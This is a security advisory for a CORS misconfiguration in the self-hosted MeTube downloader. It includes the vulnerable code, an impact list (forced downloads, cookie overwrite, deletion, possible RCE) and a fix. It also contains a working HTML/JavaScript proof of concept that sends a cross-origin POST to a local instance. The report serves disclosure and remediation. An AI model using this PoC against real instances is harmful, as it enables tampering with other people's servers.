# CVE Report: Cross-Origin Request Forgery via Permissive CORS Policy in alexta69/MeTube

## Vulnerability Summary

| Field | Value |
|-------|-------|
| **Product** | MeTube (alexta69/metube) |
| **Affected Version** | <= 2026.04.09 (all versions) |
| **Vulnerability Type** | CWE-942: Permissive Cross-domain Policy with Untrusted Domains |
| **Attack Vector** | Network (Remote) |
| **Authentication Required** | None |
| **User Interaction** | Required (victim must visit attacker-controlled page) |
| **CVSS 3.1 Base Score** | 8.1 (High) |
| **CVSS 3.1 Vector** | AV:N/AC:L/PR:N/UI:R/S:U/C:N/I:H/A:H |

## Description

MeTube is a self-hosted web UI for youtube-dl/yt-dlp with over 13,000 GitHub stars. The application reflects the `Origin` request header directly into the `Access-Control-Allow-Origin` response header without any validation or allowlist. Combined with the complete absence of authentication on all API endpoints, this allows any attacker-controlled website to perform arbitrary actions on a victim's MeTube instance via cross-origin requests.

## Root Cause

In `app/main.py`, lines 914-917, the application unconditionally reflects the requesting origin:

```python
async def on_prepare(request, response):
    if 'Origin' in request.headers:
        response.headers['Access-Control-Allow-Origin'] = request.headers['Origin']
        response.headers['Access-Control-Allow-Headers'] = 'Content-Type'

app.on_response_prepare.append(on_prepare)
```

Additionally, the Socket.IO server is configured with a wildcard CORS policy on line 226:

```python
sio = socketio.AsyncServer(cors_allowed_origins='*')
```

No API endpoint in the application requires authentication.

## Impact

An attacker who lures a victim to a malicious webpage can silently perform any of the following actions against the victim's MeTube instance:

1. **Initiate arbitrary downloads** (`POST /add`) — force the server to download any URL, consuming disk space and bandwidth. This can be used to fill the server's disk or download illegal/malicious content to the victim's machine.

2. **Overwrite cookies** (`POST /upload-cookies`) — upload attacker-controlled cookies.txt, potentially hijacking the victim's authenticated sessions on video platforms (YouTube, etc.).

3. **Delete downloads** (`POST /delete`) — wipe the victim's download queue and history.

4. **Create subscriptions** (`POST /subscribe`) — subscribe the server to arbitrary channels, causing recurring downloads.

5. **Enumerate download history** (`GET /history`) — read all current and past downloads via cross-origin requests.

6. **Achieve Remote Code Execution** — when the optional `ALLOW_YTDL_OPTIONS_OVERRIDES=true` environment variable is set, the attacker can inject a yt-dlp `Exec` postprocessor to execute arbitrary OS commands on the server (see separate report).

## Proof of Concept

Save the following as an HTML file and open it in a browser while MeTube is running on `localhost:8081`. Clicking the button initiates a download on the victim's MeTube instance from a cross-origin context.

```html
<!DOCTYPE html>
<html>
<head><title>MeTube CORS PoC</title></head>
<body>
<h2>MeTube CORS PoC</h2>
<button id="btn">Trigger cross-origin download</button>
<pre id="log"></pre>
<script>
document.getElementById('btn').onclick = async () => {
    const log = document.getElementById('log');
    try {
        const resp = await fetch('http://localhost:8081/add', {
            method: 'POST',
            headers: {'Content-Type': 'application/json'},
            body: JSON.stringify({
                url: 'https://www.youtube.com/watch?v=dQw4w9WgXcQ',
                quality: 'best',
                download_type: 'video',
                format: 'any',
                codec: 'auto'
            })
        });
        log.textContent = `[+] Response (${resp.status}): ${await resp.text()}\n`;
        log.textContent += '[+] Cross-origin download initiated successfully';
    } catch(e) {
        log.textContent = '[-] Failed: ' + e.message;
    }
};
</script>
</body>
</html>
```

### Reproduction Steps

1. Run the vulnerable version of MeTube:
   ```
   docker run -d -p 8081:8081 alexta69/metube@sha256:2ad2f7b064afc87184ce45466634048fd5c690de7c0f776bdbdf98de430173e5
   ```
2. Open the PoC HTML file in a browser
3. Click the button
4. Observe the download appear in the MeTube UI at `http://localhost:8081`
5. Confirm the cross-origin request succeeded (HTTP 200 response visible in PoC output)

## Recommended Fix

1. Remove the blanket Origin reflection. Replace with an explicit allowlist or same-origin policy:

```python
async def on_prepare(request, response):
    allowed_origin = os.environ.get('CORS_ALLOWED_ORIGIN', '')
    if allowed_origin and 'Origin' in request.headers:
        if request.headers['Origin'] == allowed_origin:
            response.headers['Access-Control-Allow-Origin'] = allowed_origin
            response.headers['Access-Control-Allow-Headers'] = 'Content-Type'
```

2. Replace the Socket.IO wildcard CORS with the same allowlist:

```python
sio = socketio.AsyncServer(cors_allowed_origins=config.CORS_ALLOWED_ORIGIN or [])
```

3. Consider adding optional API key authentication for environments exposed beyond localhost.

## Timeline

| Date | Event |
|------|-------|
| 2026-04-09 | Vulnerability discovered |
| 2026-04-09 | PoC developed and tested against version 2026.04.09 |

## References

- https://github.com/alexta69/metube
- CWE-942: https://cwe.mitre.org/data/definitions/942.html
- OWASP CORS Misconfiguration: https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/11-Client-side_Testing/07-Testing_Cross_Origin_Resource_Sharing
